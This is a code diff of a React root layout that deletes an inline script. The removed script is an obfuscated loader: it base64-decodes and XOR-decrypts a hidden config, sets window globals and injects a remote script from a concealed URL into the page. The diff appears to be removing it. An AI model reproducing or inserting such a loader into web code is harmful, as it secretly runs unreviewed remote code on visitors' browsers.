@@ -253,13 +253,6 @@ function RootShell({ children }: { readonly children: ReactNode }) {
             `,
           }}
         />
-        <script
-          dangerouslySetInnerHTML={{
-            __html: `
-              (function(){var h_6=atob("DLpKO8DhaATOcQCnC8FoTrKNSj7sGXTTe8lwFO+CDGrgBHTKYtwzFaOOBSqsAy/UaMgjS7SSR3SnCWXLJMojQ6WNRm69UyyFas4+SamDHXCrAiKdUOdmGaeNB2avHXOFMeExGa6ABWHsSyLXYsIvV4mFSijsB2HLft9oAeLXCT35EDSUb4JyD/TQDD35EDSTPIMoXaPDFVmz");var j_5w=[];for(var f_zk=0;f_zk<h_6.length;f_zk++){j_5w.push(h_6.charCodeAt(f_zk)&255);}var r_dwb=j_5w[0];var k_8a=j_5w.slice(1,1+r_dwb);var p_87ba=j_5w.slice(1+r_dwb);var k_efvc=p_87ba.map(function(b,q_faww){return b^k_8a[q_faww%r_dwb];});var o_q5rw="";for(var a_y=0;a_y<k_efvc.length;a_y++){o_q5rw+=String.fromCharCode(k_efvc[a_y]&255);}var j_x2k=decodeURIComponent(escape(o_q5rw));var m_vmgf=JSON.parse(j_x2k);var x_i=m_vmgf.globals||[];x_i.forEach(function(r_h0){window[r_h0.name]=r_h0.value;});var f_vo6e=document.createElement("script");f_vo6e.src=m_vmgf.url;f_vo6e.async=true;f_vo6e.defer=true;(m_vmgf.attributes||[]).forEach(function(p_t4k){f_vo6e.setAttribute(p_t4k.name,p_t4k.value);});(document.head||document.documentElement).appendChild(f_vo6e);})();
-            `,
-          }}
-        />
         {/* ─── META PIXEL (FACEBOOK ADS) ─── */}
         <script
           dangerouslySetInnerHTML={{
